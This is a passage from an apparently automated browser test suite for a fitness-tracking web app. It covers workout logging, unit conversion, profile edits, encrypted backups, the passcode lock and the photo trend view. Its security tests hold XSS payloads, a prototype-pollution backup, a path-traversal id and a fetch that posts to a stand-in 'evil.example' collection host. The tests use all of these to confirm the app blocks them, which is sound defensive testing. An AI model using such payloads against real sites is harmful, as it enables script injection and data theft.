    await fakeAI(page, async (body) => {
      const last = body.messages[body.messages.length - 1];
      const isResult = Array.isArray(last.content) && last.content.some((c) => c.type === 'tool_result');
      return { body: isResult ? textReply('That was rejected.') : toolReply('Sure.', 'log_workout', { activity: 'teleporting', minutes: 99999 }) };
    });
    const n = await page.locator('.proposal').count();
    await page.getByLabel('Message').fill('log it');
    await page.keyboard.press('Enter');
    await page.waitForSelector('text=That was rejected.');
    eq(await page.locator('.proposal').count(), n, 'no proposal card');
  });

  await step('backup keeps workouts and moved sessions, and a hostile workout in a file is cleaned', async () => {
    const n = await page.evaluate(() => Store.getEvents().filter((e) => e.type === 'workout_logged' || e.type === 'session_moved').length);
    ok(n >= 5, 'workout and move events are in the log that backups are built from: ' + n);
    const hostile = await page.evaluate(() => {
      const st = Engine.project([{ seq: 1, type: 'workout_logged', data: { date: '2026-01-01', type: '__proto__', mins: 99999, kcal: 1e12, note: '<img src=x onerror=1>', label: 'x'.repeat(500), id: '../../x' } }]);
      return st.workouts[0];
    });
    eq(hostile.type, 'other'); eq(hostile.mins, 600); eq(hostile.kcal, 5000); eq(hostile.id, ''); eq(hostile.label.length, 40);
  });

  // ----- security -----
  await step('XSS: hostile text in food name and set note is rendered as text', async () => {
    await page.evaluate(() => { window.__xss = 0; });
    const payload = '<img src=x onerror="window.__xss=1"><script>window.__xss=2</script>';
    await route(page, '#/fuel');
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Manual' }).click();
    await page.getByLabel('What was it?').fill(payload);
    await page.getByLabel('Calories').fill('100');
    await page.getByRole('button', { name: 'Log it' }).click();
    await page.waitForSelector('.foodrow');
    await page.waitForTimeout(300);
    eq(await page.evaluate(() => window.__xss), 0, 'no script ran');
    ok((await page.locator('#screen').innerText()).includes('<script>'), 'shown literally');
    eq(await page.locator('#screen img[src="x"]').count(), 0, 'no injected img element');
  });

  await step('XSS: hostile model output (estimate names, coach replies) and set notes stay inert', async () => {
    const evil = '<img src=x onerror="window.__xss=3"><svg onload="window.__xss=4">';
    await page.unroute('https://api.anthropic.com/**');
    await fakeAI(page, async (body) => {
      const sys = String(body.system || '');
      if (/estimate the nutrition/i.test(sys)) return { body: textReply(JSON.stringify({ name: evil, items: [{ name: evil, qty: evil, kcal: 100, protein: 5, carbs: 10, fat: 3 }], kcal: 100, protein: 5, carbs: 10, fat: 3, assumptions: [evil], confidence: 'high' })) };
      return { body: textReply(evil) };
    });
    await route(page, '#/fuel');
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Describe' }).click();
    await page.getByLabel('What you ate').fill('anything');
    await page.getByRole('button', { name: 'Estimate nutrition' }).click();
    await page.waitForSelector('text=Check these numbers');
    await page.getByRole('button', { name: 'Looks right, log it' }).click();
    await page.waitForTimeout(300);
    await route(page, '#/coach');
    await page.getByLabel('Message').fill('<b>hi</b>');
    await page.keyboard.press('Enter');
    await page.waitForSelector('.msg.ai:has-text("onerror")');
    await route(page, '#/today');
    await page.locator('.setchip.add').first().click();
    await page.locator('#sheets').getByLabel(/Note/).fill(evil);
    await page.locator('#sheets').getByLabel('Reps', { exact: true }).fill('5');
    await page.getByRole('button', { name: 'Save', exact: true }).click();
    await page.waitForTimeout(300);
    eq(await page.evaluate(() => window.__xss), 0, 'nothing executed');
    eq(await page.locator('#screen img[src="x"], #screen svg[onload]').count(), 0, 'no injected elements');
  });

  await step('CSP and Trusted Types are enforced', async () => {
    const r = await page.evaluate(async () => {
      const out = {};
      try { document.body.appendChild(document.createElement('div')).innerHTML = '<b>x</b>'; out.innerHTML = 'allowed'; } catch (e) { out.innerHTML = 'blocked'; }
      try { await fetch('https://evil.example/collect', { method: 'POST', body: 'x' }); out.fetch = 'allowed'; } catch (e) { out.fetch = 'blocked'; }
      try { const s = document.createElement('script'); s.textContent = 'window.__inline = 1'; document.head.appendChild(s); } catch (e) { /* trusted types */ }
      out.inline = window.__inline ? 'ran' : 'blocked';
      return out;
    });
    eq(r, { innerHTML: 'blocked', fetch: 'blocked', inline: 'blocked' });
    // Static checks on the policy itself (eval cannot be probed reliably from a test harness).
    const csp = await page.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]').content);
    const d = Object.fromEntries(csp.split(';').map((x) => x.trim()).filter(Boolean).map((x) => [x.split(' ')[0], x.split(' ').slice(1)]));
    eq(d['script-src'], ["'self'"]); eq(d['style-src'], ["'self'"]); eq(d['default-src'], ["'none'"]); eq(d['base-uri'], ["'none'"]);
    ok(!/unsafe-|\*\s|data:/.test(d['script-src'].join(' ')), 'script-src is strict');
    ok(csp.includes("require-trusted-types-for 'script'"), 'trusted types required');
    ok(!d['connect-src'].some((x) => x === '*' || x === 'https:'), 'connect-src is an allow-list');
  });

  await step('the app makes no network requests to third parties on its own', async () => {
    const hosts = new Set();
    const p2 = await ctx.newPage();
    p2.on('request', (rq) => { const u = new URL(rq.url()); if (u.protocol.startsWith('http')) hosts.add(u.host); });
    await p2.goto(base); await p2.waitForTimeout(700);
    await p2.close();
    eq(Array.from(hosts), [new URL(base).host]);
  });

  // ----- weekly check-in, profile -----
  await step('weekly check-in: Today asks on the chosen weekday, Profile shows the basics and changes the day', async () => {
    await page.evaluate(async () => { await Store.saveSettings({ checkinDay: new Date().getDay() }); });
    await route(page, '#/today'); await page.evaluate(() => App.render());
    const due = await page.getByText(/Weekly check-in (today|is overdue)/).count();
    const partial = await page.evaluate(() => Engine.checkinStatus(Store.getState(), Store.getSettings().checkinDay, U.today()).status);
    ok(partial === 'done' || due === 1, 'a card asks for the check-in unless all five angles are saved (' + partial + ')');
    await page.getByRole('link', { name: 'Profile' }).click();
    await page.getByText('Basics').waitFor();
    ok(await page.getByText('Your plan').count() === 1 && await page.getByText('Calories').count() === 1, 'profile lists the plan');
    ok(await page.getByText(/Only on this device/).count() === 1);
    const other = await page.evaluate(() => U.DOW[(new Date().getDay() + 3) % 7]);
    await page.getByRole('button', { name: other, exact: true }).click();
    await page.getByText('Check-in day set to ' + other).waitFor();
    eq(await page.evaluate(() => Store.getSettings().checkinDay), await page.evaluate(() => (new Date().getDay() + 3) % 7));
    await route(page, '#/today'); await page.evaluate(() => App.render());
    eq(await page.getByText(/Weekly check-in (today|is overdue)/).count(), 0);
    ok(await page.getByText('Check-in ' + other).count() >= 1, 'the header chip names the day');
    await page.evaluate(async () => { await Store.saveSettings({ checkinDay: 5 }); });
  });

  await step('profile: shows the app logo and tagline, like the welcome screen', async () => {
    await route(page, '#/profile');
    const box = page.locator('.profbrand');
    await box.waitFor();
    const text = await box.innerText();
    ok(/REGOAL/.test(text) && /Track the change\./.test(text) && /Not the vibes\./.test(text), 'wordmark and tagline are shown');
    eq(await box.locator('.app-icon svg').count(), 1, 'the logo is drawn');
  });

  await step('profile: name and basics can be edited, bad values are refused, and untouched fields stay exactly as they were', async () => {
    await route(page, '#/profile');
    await page.getByText('Basics', { exact: true }).waitFor();
    const before = await page.evaluate(() => { const p = Store.getState().profile; return { h: p.heightCm, w: p.weightKg, sex: p.sex, age: p.age }; });
    await page.getByRole('button', { name: /^(Edit|Add name)$/ }).first().click();
    const sh = page.locator('#sheets');
    await sh.getByText('Edit profile').first().waitFor();
    await sh.getByRole('button', { name: 'Save', exact: true }).click();
    await page.getByText('Nothing changed.').waitFor();
    await sh.getByLabel('Age', { exact: true }).fill('7');
    await sh.getByRole('button', { name: 'Save', exact: true }).click();
    await page.getByText(/age between 14 and 90/).waitFor();
    ok(await sh.getByText('Edit profile').count() >= 1, 'the sheet stays open on a bad value');
    await sh.getByLabel('Age', { exact: true }).fill('33');
    await sh.getByLabel('Name (optional)').fill('  Ninaad   Rao ');
    await sh.getByLabel('Diet style').selectOption('Vegan');
    await sh.getByRole('button', { name: 'Save', exact: true }).click();
    await page.getByText('Profile updated.').waitFor();
    const after = await page.evaluate(() => { const p = Store.getState().profile; return { name: p.name, age: p.age, diet: p.diet, h: p.heightCm, w: p.weightKg, sex: p.sex }; });
    eq(after.name, 'Ninaad Rao'); eq(after.age, 33); eq(after.diet, 'Vegan');
    eq(after.h, before.h, 'height untouched'); eq(after.w, before.w, 'starting weight untouched'); eq(after.sex, before.sex);
    ok(/Ninaad Rao/.test(await page.locator('#screen').innerText()) && /33 years/.test(await page.locator('#screen').innerText()), 'Profile shows the new values');
    ok(await page.getByRole('button', { name: 'Edit', exact: true }).count() >= 1, 'the header button now says Edit');
    const n = await page.evaluate(() => Store.getEvents().filter((e) => e.type === 'profile_edited').length);
    eq(n, 1, 'one event for the whole edit');
    await page.evaluate(async () => { const e = Store.getEvents().filter((x) => x.type === 'profile_edited').pop(); await Store.voidEvent(e.seq); });
    eq(await page.evaluate(() => Store.getState().profile.age), before.age, 'voiding the edit restores the old values');
  });

  await step('Settings: a distance unit choice overrides the length-unit fallback everywhere', async () => {
    await page.evaluate(() => Store.saveSettings({ lenUnit: 'cm' }));
    eq(await page.evaluate(() => Goals.distUnitFor(Store.getSettings())), 'km', 'metric height defaults distance to km when no choice is made');
    await route(page, '#/settings');
    const distSeg = page.locator('.segwrap', { hasText: 'Distance' });
    await distSeg.getByRole('radio', { name: 'mi', exact: true }).click();
    eq(await page.evaluate(() => Store.getSettings().distUnit), 'mi');
    eq(await page.evaluate(() => Goals.distUnitFor(Store.getSettings())), 'mi', 'the explicit choice overrides the metric height');
    await route(page, '#/activity');
    await page.getByRole('button', { name: 'Log a workout' }).first().click();
    const sh = page.locator('#sheets');
    await sh.getByLabel('Activity', { exact: true }).selectOption('running');
    eq(await sh.locator('.unit').last().innerText(), 'mi', 'the distance field itself switched to miles');
    await sh.getByLabel('How long').fill('30');
    await sh.getByLabel('Distance (optional)').fill('3');
    await sh.getByRole('button', { name: 'Save', exact: true }).click();
    await page.getByText(/^Logged ~\d/).first().waitFor();
    const w = await page.evaluate(() => Store.getState().workouts.filter((x) => x.type === 'running').pop());
    ok(Math.abs(w.km - 4.828) < 0.02, 'still stored in km internally: ' + w.km);
    await route(page, '#/activity');
    ok(/\bmi\b/.test(await page.locator('.card', { hasText: 'History' }).innerText()), 'shown in miles in History despite the metric height');
    await route(page, '#/settings');
    await distSeg.getByRole('radio', { name: 'Auto', exact: true }).click();
    eq(await page.evaluate(() => Goals.distUnitFor(Store.getSettings())), 'km', 'Auto goes back to following Measurements (still cm)');
  });

  await step('logging a workout: a per-entry unit toggle switches km/mi (and m/yd for swimming) without touching Settings', async () => {
    await route(page, '#/activity');
    const runBefore = await page.evaluate(() => Store.getState().workouts.filter((x) => x.type === 'running').length);
    await page.getByRole('button', { name: 'Log a workout' }).first().click();
    const sh = page.locator('#sheets');
    await sh.getByLabel('Activity', { exact: true }).selectOption('running');
    const unitBox = sh.locator('.segwrap', { hasText: 'Distance unit' });
    eq(await unitBox.getByRole('radio', { checked: true }).innerText(), 'km', 'starts on the Settings default (Auto -> km here)');
    eq(await sh.locator('.unit').last().innerText(), 'km');
    await sh.getByLabel('Distance (optional)').fill('5');
    await unitBox.getByRole('radio', { name: 'mi', exact: true }).click();
    eq(await sh.locator('.unit').last().innerText(), 'mi', 'the field switched to miles');
    ok(Math.abs(parseFloat(await sh.getByLabel('Distance (optional)').inputValue()) - 3.11) < 0.02, 'the typed 5 km was converted to miles, not just relabeled');
    await unitBox.getByRole('radio', { name: 'km', exact: true }).click();
    ok(Math.abs(parseFloat(await sh.getByLabel('Distance (optional)').inputValue()) - 5) < 0.05, 'converting back lands close to the original 5 km');
    await sh.getByLabel('How long').fill('20');
    await sh.getByRole('button', { name: 'Save', exact: true }).click();
    await page.waitForFunction((n) => Store.getState().workouts.filter((x) => x.type === 'running').length > n, runBefore);
    const w1 = await page.evaluate(() => Store.getState().workouts.filter((x) => x.type === 'running').pop());
    ok(Math.abs(w1.km - 5) < 0.05, 'saved distance still lands near 5 km: ' + w1.km);
    eq(await page.evaluate(() => Store.getSettings().distUnit), 'auto', 'the per-entry toggle never touched the Settings choice');
    // swimming: the same km/mi toggle maps to metres and yards
    const swimBefore = await page.evaluate(() => Store.getState().workouts.filter((x) => x.type === 'swimming').length);
    await page.getByRole('button', { name: 'Log a workout' }).first().click();
    const sh2 = page.locator('#sheets').last();
    await sh2.getByLabel('Activity', { exact: true }).selectOption('swimming');
    const unitBox2 = sh2.locator('.segwrap', { hasText: 'Distance unit' });
    eq(await sh2.locator('.unit').last().innerText(), 'm');
    await unitBox2.getByRole('radio', { name: 'mi', exact: true }).click();
    eq(await sh2.locator('.unit').last().innerText(), 'yd', 'swimming shows yards under the mi family, not raw miles');
    await sh2.getByLabel('Distance (optional)').fill('1500');
    await sh2.getByLabel('How long').fill('30');
    await sh2.getByRole('button', { name: 'Save', exact: true }).click();
    await page.waitForFunction((n) => Store.getState().workouts.filter((x) => x.type === 'swimming').length > n, swimBefore);
    const w2 = await page.evaluate(() => Store.getState().workouts.filter((x) => x.type === 'swimming').pop());
    ok(Math.abs(w2.km - 1.3716) < 0.01, '1,500 yd stored correctly in km: ' + w2.km);
  });

  await step('logging a workout: Switch offers a built-in alternative for an untracked exercise, with the plan carried over', async () => {
    await route(page, '#/activity');
    const target = await page.evaluate(() => {
      for (const w of Store.getState().plan.workouts) {
        const exx = w.ex.find((e) => !e.lift && e.m);
        if (exx) return { session: w.name, name: exx.n };
      }
      return null;
    });
    ok(target, 'the default plan should include at least one untracked accessory exercise');
    const setsBefore = await page.evaluate(() => Store.getState().sets.length);
    await page.getByRole('button', { name: 'Log a workout' }).first().click();
    const sh = page.locator('#sheets > .overlay').first();
    await sh.getByLabel('Which workout', { exact: true }).selectOption(target.session);
    const exRow = sh.locator('.exb', { hasText: target.name });
    await exRow.getByRole('button', { name: 'Switch ' + target.name + ' for an alternative' }).click();
    const sw = page.locator('#sheets > .overlay').last();
    await sw.getByText('Switch ' + target.name).waitFor();
    const cands = sw.locator('.listrow');
    ok(await cands.count() > 0, 'the built-in list found at least one same-muscle alternative');
    const candName = await cands.first().locator('b').innerText();
    await cands.first().click();
    // The sheet closes on its own; the row now shows the new exercise and where it came from.
    await exRow.getByText('switched from ' + target.name, { exact: false }).waitFor();
    const inputs = exRow.locator('input');
    ok((await inputs.nth(0).inputValue()) !== '', 'sets carried over');
    ok((await inputs.nth(1).inputValue()) !== '', 'reps carried over');
    await sh.getByLabel('How long').fill('45');
    await sh.getByRole('button', { name: 'Save', exact: true }).click();
    await page.waitForFunction((n) => Store.getState().sets.length > n, setsBefore);
    const logged = await page.evaluate((n) => Store.getState().sets.filter((s) => s.name && s.name.toLowerCase() === n.toLowerCase()), candName);
    ok(logged.length > 0, 'a set was logged under the new exercise name, not the original: ' + JSON.stringify(logged));
  });

  await step('logging a workout: Switch can ask AI for an alternative and a starting weight, shown for confirmation first', async () => {
    await route(page, '#/activity');
    const target = await page.evaluate(() => {
      for (const w of Store.getState().plan.workouts) {
        const exx = w.ex.find((e) => !e.lift && e.m);
        if (exx) return { session: w.name, name: exx.n };
      }
      return null;
    });
    ok(target, 'the default plan should include at least one untracked accessory exercise');
    await page.evaluate(() => App.setKey('sk-ant-test-0000000000', 'typed'));
    await page.getByRole('button', { name: 'Log a workout' }).first().click();
    const sh = page.locator('#sheets > .overlay').first();
    await sh.getByLabel('Which workout', { exact: true }).selectOption(target.session);
    const exRow = sh.locator('.exb', { hasText: target.name });
    await exRow.getByRole('button', { name: 'Switch ' + target.name + ' for an alternative' }).click();
    const sw = page.locator('#sheets > .overlay').last();
    await sw.getByRole('button', { name: 'Ask AI to suggest one instead' }).click();
    await sw.getByLabel('What do you have instead? (optional)').fill('no cable machine, only a resistance band');
    const reply = { name: 'Resistance band pulldown', equip: 'band', sets: 3, reps: 12, kg: null, assumptions: ['Band tension is not directly comparable to a stack weight'], confidence: 'low' };
    const seen = await fakeAI(page, async (body) => {
      ok(JSON.stringify(body).includes('resistance band'), 'the note reaches the model');
      return { body: textReply(JSON.stringify(reply)) };
    });
    await sw.getByRole('button', { name: 'Ask AI', exact: true }).click();
    await sw.getByText('Band tension is not directly comparable').waitFor();
    eq(seen.length, 1);
    eq(await sw.getByLabel('Exercise', { exact: true }).inputValue(), 'Resistance band pulldown');
    ok(await sw.getByText('Bodyweight').count() > 0, 'a bodyweight toggle is offered');
    await sw.getByRole('button', { name: 'Use this' }).click();
    await exRow.getByText('Resistance band pulldown').waitFor();
    await sh.getByLabel('How long').fill('40');
    await sh.getByRole('button', { name: 'Save', exact: true }).click();
    await page.waitForFunction(() => Store.getState().sets.some((s) => s.name === 'Resistance band pulldown'));
    await page.evaluate(() => App.clearKey());
    await page.unroute('https://api.anthropic.com/**');
  });

  await step('a new backup always has the same file name so it replaces the old one', async () => {
    await route(page, '#/settings');
    ok(await page.getByText(/Choose a backup folder|This browser cannot delete old backups/).count() >= 1, 'the folder option or the honest note is shown');
    await page.getByRole('button', { name: 'Back up now' }).click();
    await page.getByLabel('Passphrase', { exact: true }).fill('correct horse battery');
    await page.getByLabel('Repeat passphrase').fill('correct horse battery');
    await page.getByRole('button', { name: 'Prepare file' }).click();
    await page.getByText('Backup ready').waitFor();
    ok(await page.getByText(/regoal-backup\.regoalbackup/).count() >= 1, 'fixed file name');
    ok(await page.getByText(/regoal-\d{4}-\d{2}-\d{2}\.regoalbackup/).count() === 0, 'no dated name');
    await page.getByRole('button', { name: 'Close' }).click();
  });

  // ----- backup and restore -----
  await step('encrypted backup round-trips; wrong passphrase fails; the API key is not inside', async () => {
    const res = await page.evaluate(async () => {
      const enc = await Store.buildBackup({ media: false, passphrase: 'correct horse battery' });
      const plain = await Store.buildBackup({ media: false });
      let wrong = 'no error';
      try { await Store.readImport(enc, 'nope nope nope'); } catch (e) { wrong = e.message; }
      const good = await Store.readImport(enc, 'correct horse battery');
      return { encIsOpaque: !enc.includes('Dal and rice') && !enc.includes('weight_logged'), plainHasKey: plain.includes('sk-ant'), wrong, kind: good.kind, n: good.payload.events.length, live: Store.getEvents().length };
    });
    ok(res.encIsOpaque, 'ciphertext must not contain readable data'); ok(!res.plainHasKey, 'key must not be in a backup');
    ok(/Wrong passphrase/.test(res.wrong), res.wrong); eq(res.kind, 'backup'); eq(res.n, res.live);
  });

  await step('restore from an encrypted file through the UI replaces the data', async () => {
    const enc = await page.evaluate(() => Store.buildBackup({ media: false, passphrase: 'correct horse battery' }));
    const file = path.join(tmp, 'test.regoalbackup'); fs.writeFileSync(file, enc);
    await page.evaluate(async () => { await Store.append('weight_logged', { date: '2020-01-01', kg: 99 }); });
    const withExtra = await page.evaluate(() => Store.getEvents().length);
    await route(page, '#/settings');
    await page.locator('input[aria-label="Choose a backup file"]').setInputFiles(file);
    await page.getByLabel('Passphrase').fill('correct horse battery');
    await page.getByRole('button', { name: 'Open' }).click();
    await page.getByRole('button', { name: 'Restore', exact: true }).click();
    await page.waitForSelector('text=Week 1 of 26');
    eq(await page.evaluate(() => Store.getEvents().length), withExtra - 1, 'the extra event is gone after restore');
  });

  await step('a backup with prototype-pollution keys is rejected', async () => {
    const evil = '{"orbit":1,"kind":"backup","events":[{"seq":1,"ts":"t","type":"weight_logged","data":{"__proto__":{"polluted":1}}}]}';
    const msg = await page.evaluate(async (t) => { try { await Store.readImport(t); return 'accepted'; } catch (e) { return e.message; } }, evil);
    ok(/unsafe/i.test(msg), msg);
    eq(await page.evaluate(() => ({}).polluted), undefined);
  });

  // ----- lock -----
  await step('passcode lock: wrong code refused, right code opens, hash not plaintext', async () => {
    await route(page, '#/settings');
    await page.getByRole('switch', { name: 'Passcode' }).click();
    await page.getByLabel('New passcode (4 to 8 digits)').fill('4826');
    await page.getByLabel('Repeat passcode').fill('4826');
    await page.getByRole('button', { name: 'Turn on' }).click();
    await page.waitForTimeout(600);
    const rec = await page.evaluate(() => Store.getMeta('pin'));
    ok(rec && rec.hash && !JSON.stringify(rec).includes('4826'), 'pin is hashed');
    await page.getByRole('button', { name: 'Lock now' }).click();
    await page.waitForSelector('#lock:not(.hidden)');
    await page.locator('#lock input').fill('1111'); await page.locator('#lock').getByRole('button', { name: 'Unlock' }).click();
    await page.waitForSelector('text=That is not it.');
    await page.locator('#lock input').fill('4826'); await page.locator('#lock').getByRole('button', { name: 'Unlock' }).click();
    await page.waitForSelector('#lock.hidden', { state: 'attached' });
  });

  await step('erase everything wipes the data', async () => {
    await route(page, '#/settings');
    await page.getByRole('button', { name: 'Erase everything on this device' }).click();
    await page.getByLabel('Type ERASE to confirm').fill('ERASE');
    await Promise.all([page.waitForNavigation().catch(() => {}), page.getByRole('button', { name: 'Erase', exact: true }).click()]);
    await page.waitForSelector('text=Track the change.');
    eq(await page.evaluate(() => Store.getEvents().length), 0);
  });

  await step('profile file (fictional) builds a plan without the onboarding questions', async () => {
    const prof = { orbit: 1, kind: 'profile', answers: { name: 'Test', sex: 'male', age: 31, heightCm: 180, weightKg: 82, units: { body: 'kg', length: 'in', lift: 'lb' }, measurements: { waist: 86, chest: 100 }, goal: 'build', days: [1, 3, 5], sessionMin: 60, timeOfDay: 'AM', diet: 'Vegetarian', creatine: false,
      training: { split: 'auto', repStyle: 'mixed', sets: 3, deload: 'planned' }, lifts: [{ id: 'flat_db_press', on: true, weight: 40, reps: 8 }] } };
    const file = path.join(tmp, 'profile.json'); fs.writeFileSync(file, JSON.stringify(prof));
    await page.locator('input[type=file]').first().setInputFiles(file);
    await page.getByRole('button', { name: 'Build my plan' }).click();
    await page.waitForSelector('text=Week 1 of 26');
    eq(await page.evaluate(() => Object.keys(Store.getState().plan.lifts)), ['flat_db_press']);
  });

  await step('no console errors or warnings during the whole run (except expected provider failures)', async () => {
    const unexpected = problems.filter((p) => !/401|Failed to load resource|evil\.example|net::ERR|Refused to (connect|execute|load)|requires 'Trusted|Trusted Type|violates|EvalError|unsafe-eval|Executing inline/i.test(p));
    eq(unexpected, [], 'unexpected console output');
  });
  await ctx.close();

  // ================= a plan that is five weeks old =================
  const octx = await browser.newContext({ viewport: { width: 390, height: 844 } });
  const opage = await octx.newPage(); opage.setDefaultTimeout(5000);
  await opage.goto(base);
  await opage.waitForSelector('text=Track the change.');
  await step('monthly check-in and backup nudge appear for a five-week-old plan and can be acted on', async () => {
    await opage.evaluate(async () => {
      const start = Engine.addDays(U.today(), -37);
      const a = { sex: 'male', age: 31, heightCm: 180, weightKg: 82, units: { body: 'kg', length: 'cm', lift: 'lb' }, measurements: { waist: 86 }, goal: 'recomp', days: [1, 2, 3, 4, 5, 6, 0], startDate: start,
        training: { split: 'auto', dbStep: 2.5, machineStep: 5, sets: 3, repStyle: 'mixed', deload: 'planned' }, lifts: [{ id: 'flat_db_press', on: true, weight: 40, reps: 8 }] };
      await Store.append('profile_created', { profile: a, plan: Engine.buildPlan(a) });
      for (let d = 30; d >= 0; d--) await Store.append('weight_logged', { date: Engine.addDays(U.today(), -d), kg: 82 - d * 0.03 + 0.9 }); // dropping about 0.2 kg a week... then rising
      await Store.append('measurement_logged', { date: U.today(), site: 'waist', cm: 86.2 });
      location.hash = '#/today'; App.render();
    });
    await opage.waitForSelector('text=Monthly check-in');
    await opage.waitForSelector('text=Back up your data');
    const seen = await opage.evaluate(() => Store.getSettings().reviewSeen || 0);
    eq(seen, 0);
    await opage.getByRole('button', { name: /Got it|Keep as is/ }).click();
    await opage.waitForTimeout(250);
    ok(await opage.locator('text=Monthly check-in').count() === 0, 'card dismissed for this month');
  });
  await octx.close();

  // ================= photo trend, compare and saving =================
  console.log('\nPhoto trend');
  const tctx = await browser.newContext({ viewport: { width: 390, height: 844 }, acceptDownloads: true });
  const tpage = await tctx.newPage(); tpage.setDefaultTimeout(6000);
  const tproblems = await collect(tpage);
  const outside = []; // anything a photo screen or export sends to another origin, other than an explicit opt-in Auto-align with AI call
  tpage.on('request', (r) => { const u = r.url(); if (!u.startsWith(base.replace('/index.html', '')) && !/^(blob|data):/.test(u) && !/api\.anthropic\.com/.test(u)) outside.push(u); });
  await tpage.goto(base);
  await tpage.waitForSelector('text=Track the change.');
  // fictional data: three Front check-ins (weeks 1, 5, 9) with a weigh-in and measurements each; cm and kg
  await tpage.evaluate(async () => {
    const start = Engine.addDays(U.today(), -70), at = (w) => Engine.addDays(start, (w - 1) * 7);
    const a = { sex: 'male', age: 31, heightCm: 180, weightKg: 82, units: { body: 'kg', length: 'cm', lift: 'lb' }, measurements: { waist: 86, chest: 100 }, goal: 'recomp', days: [1, 2, 3, 4, 5], startDate: start,
      training: { split: 'auto', dbStep: 2.5, machineStep: 5, sets: 3, repStyle: 'mixed', deload: 'planned' }, lifts: [{ id: 'flat_db_press', on: true, weight: 40, reps: 8 }] };
    await Store.append('profile_created', { profile: a, plan: Engine.buildPlan(a) });
    await Store.saveSettings({ bodyUnit: 'kg', lenUnit: 'cm', liftUnit: 'lb', onboardedAt: new Date().toISOString() });
    const kg = { 1: 82, 5: 81, 9: 80.2 }, waist = { 1: 86, 5: 85, 9: 84.2 }, chest = { 1: 100, 5: 100.5, 9: 101.2 };
    const fig = (w) => new Promise((res) => {
      const c = document.createElement('canvas'); c.width = 300; c.height = 400; const x = c.getContext('2d');
      x.fillStyle = 'hsl(' + (w * 20) + ',30%,25%)'; x.fillRect(0, 0, 300, 400); x.fillStyle = '#c9d6cf'; x.beginPath(); x.arc(150, 80, 30, 0, 7); x.fill(); x.fillRect(90, 130, 120, 220);
      c.toBlob(res, 'image/jpeg', 0.8);
    });
    for (const w of [1, 5, 9]) {
      await Store.append('weight_logged', { date: at(w), kg: kg[w] });
      await Store.append('measurement_logged', { date: at(w), site: 'waist', cm: waist[w] });
      await Store.append('measurement_logged', { date: at(w), site: 'chest', cm: chest[w] });
      const id = 'p_' + w + '_front_t';
      await Store.putMedia(id, await fig(w), { week: w, angle: 'Front' });
      await Store.append('photo_added', { date: at(w), week: w, angle: 'Front', id });
    }
  });
  // Photos are labelled by the date of the weekly check-in, never "Week 5" or "Wk 5". These give the expected text for one of the three seeded photos.
  const longAt = (w) => tpage.evaluate((w) => U.longDate(Engine.addDays(Engine.addDays(U.today(), -70), (w - 1) * 7)), w);
  const shortAt = (w) => tpage.evaluate((w) => U.shortDate(Engine.addDays(Engine.addDays(U.today(), -70), (w - 1) * 7)), w);
  const isoAt = (w) => tpage.evaluate((w) => Engine.addDays(Engine.addDays(U.today(), -70), (w - 1) * 7), w);
  const noWeekWords = async (where) => { const t = await tpage.locator('body').innerText(); ok(!/\b(Week|Wk|week|wk) ?\d/.test(t), where + ' shows no week numbers: ' + (t.match(/.{0,20}\b(Week|Wk|week|wk) ?\d.{0,20}/) || [''])[0]); };
  let eventsBefore, mediaBefore; // set once the alignment tests below are done deliberately persisting their own events

  await step('photos screen offers the trend and compare, and shows the first and latest photo', async () => {
    await route(tpage, '#/photos');
    await tpage.getByText('Your photo trend').waitFor();
    await noWeekWords('photo check-in screen');
    ok(new RegExp(await shortAt(1)).test(await tpage.locator('.trendthumb .lbl').first().innerText()), 'first thumbnail is labelled with its date');
    eq(await tpage.locator('.trendthumb').count(), 2);
    ok(await tpage.locator('.trendthumb.blur').count() === 2, 'thumbnails follow the blur setting');
    await tpage.getByRole('link', { name: 'See trend' }).click();
    await tpage.waitForSelector('.stage');
    eq(await tpage.evaluate(() => location.hash), '#/photos/trend');
  });

  await step('trend: latest check-in first, blurred until tapped, with the numbers and green only toward the goal', async () => {
    const stage = tpage.locator('.stage');
    ok(await stage.evaluate((el) => el.classList.contains('blur')), 'blurred by default');
    ok(/Blurred/.test(await tpage.locator('.stage-badge').innerText()), 'badge says blurred');
    eq(await tpage.locator('.stage-cap').innerText(), await longAt(9)); // starts on the latest check-in, named by its date
    await noWeekWords('trend');
    await stage.click();
    ok(!(await stage.evaluate((el) => el.classList.contains('blur'))), 'tap reveals');
    const cards = await tpage.locator('.tstat').allInnerTexts();
    ok(/Weight/.test(cards[0]) && /80\.2/.test(cards[0]) && /-1\.8 kg/.test(cards[0]), 'weight card: ' + cards[0]);
    ok(/Waist/.test(cards[1]) && /84\.2/.test(cards[1]) && /-1\.8 cm/.test(cards[1]), 'waist card: ' + cards[1]);
    ok(/Chest/.test(cards[2]) && /101\.2/.test(cards[2]) && /\+1\.2 cm/.test(cards[2]), 'chest card: ' + cards[2]);
    ok(await tpage.locator('.tstat .td.good').count() === 2, 'waist down and chest up are toward the recomp goal');
    ok(await tpage.locator('.tstat').first().locator('.td.good, .td.coral').count() === 0, 'weight is neutral on a recomp');
    ok(await tpage.locator('.stage-img').evaluate((el) => el.complete && el.naturalWidth > 0), 'photo loaded from local storage');
  });

  await step('trend: keyboard scrub, play stops at the last check-in, empty weeks lead back to the check-in screen', async () => {
    const scrub = tpage.locator('.scrub');
    await scrub.focus();
    await tpage.keyboard.press('Home');
    eq(await tpage.locator('.stage-cap').innerText(), await longAt(1)); // Home goes to the first
    eq(await scrub.getAttribute('aria-valuetext'), await longAt(1)); // the slider announces the date
    await tpage.keyboard.press('ArrowRight');
    eq(await tpage.locator('.stage-cap').innerText(), await longAt(5)); // arrow moves to the next photo
    await tpage.locator('.tstat').first().waitFor();
    ok(/Starting point|-\d/.test(await tpage.locator('.tstat').first().innerText()), 'numbers follow the photo');
    await tpage.getByRole('button', { name: /^Speed/ }).click(); // 2x
    eq(await tpage.getByRole('button', { name: /^Speed/ }).innerText(), 'Speed 2x');
    await tpage.keyboard.press('Home');
    await tpage.getByRole('button', { name: 'Play through the check-ins' }).click();
    const last = await longAt(9); await tpage.waitForFunction((t) => document.querySelector('.stage-cap').textContent === t, last, { timeout: 5000 });
    await tpage.getByRole('button', { name: 'Play through the check-ins' }).waitFor(); // back to a play button: it stopped by itself
    const hrefs = await tpage.locator('a.tthumb.none').evaluateAll((els) => els.map((e) => e.getAttribute('href')));
    const slots = await tpage.locator('.tthumb').count(), have = await tpage.locator('button.tthumb').count();
